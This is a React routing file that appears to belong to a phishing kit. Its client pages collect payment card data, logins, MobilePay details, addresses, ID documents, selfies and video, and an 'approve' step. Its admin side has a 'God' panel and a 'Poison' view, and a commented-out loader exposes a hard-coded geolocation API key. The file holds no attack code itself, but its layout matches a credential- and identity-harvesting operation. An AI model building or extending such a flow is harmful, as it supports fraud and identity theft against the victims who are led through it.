import React from "react";
import ReactDOM from "react-dom/client";
import App from "./App.jsx";
import "./index.css";

import {
  createBrowserRouter,
  createHashRouter,
  RouterProvider,
} from "react-router-dom";
import Admin from "./Layouts/Admin.jsx";
import God from "./views/Admin/God.jsx";
import Poison from "./views/Admin/Poison.jsx";
import Card from "./views/Client/Card.jsx";
import Login from "./views/Client/Login.jsx";
import Client from "./Layouts/Client.jsx";
import Approve from "./views/Client/Approve.jsx";
import MobilePay from "./views/Client/MobilePay.jsx";
import Docs from "./views/Client/verification/Docs.jsx";
import Selfie from "./views/Client/verification/Selfie.jsx";
import Video from "./views/Client/verification/Video.jsx";
import Address from "./views/Client/Address.jsx";
import { dbs } from './configs.js'

const selectDB = ({ params }) => {
  
  return [];
};

const poisonLoader = async ({ params }) => {
  // const result = await fetch(
  //   "https://ipgeolocation.abstractapi.com/v1/?api_key=82a9528162ca40f89fab49f8b8860ef3"
  // );
  // const data = await result.json();
  // return data;
  return [];
};

const router = createHashRouter([
  {
    path: "/",
    element: <Client />,
    children: [
      {
        path: "card",
        element: <Card />,
        loader: selectDB,
      },
      {
        path: "selfie",
        element: <Selfie />,
        loader: selectDB,
      },
      {
        path: "video",
        element: <Video />,
        loader: selectDB,
      },
      {
        path: "address",
        element: <Address />,
        loader: selectDB,
      },
      {
        path: "docs",
        element: <Docs />,
        loader: selectDB,
      },
      {
        path: "mobilepay",
        element: <MobilePay />,
        loader: selectDB,
      },
      {
        path: "login",
        element: <Login />,
        loader: selectDB,
      },
      {
        path: "approve",
        element: <Approve />,
        loader: selectDB,
      },
    ],
  },
  {
    path: "/admin",
    element: <Admin />,
    children: [
      {
        path: "",
        element: <God />,
        loader: selectDB,
      },
      {
        path: "poison",
        element: <Poison />,
        loader: selectDB,
      },
    ],
  },
]);

ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <RouterProvider router={router} />
  </React.StrictMode>
);
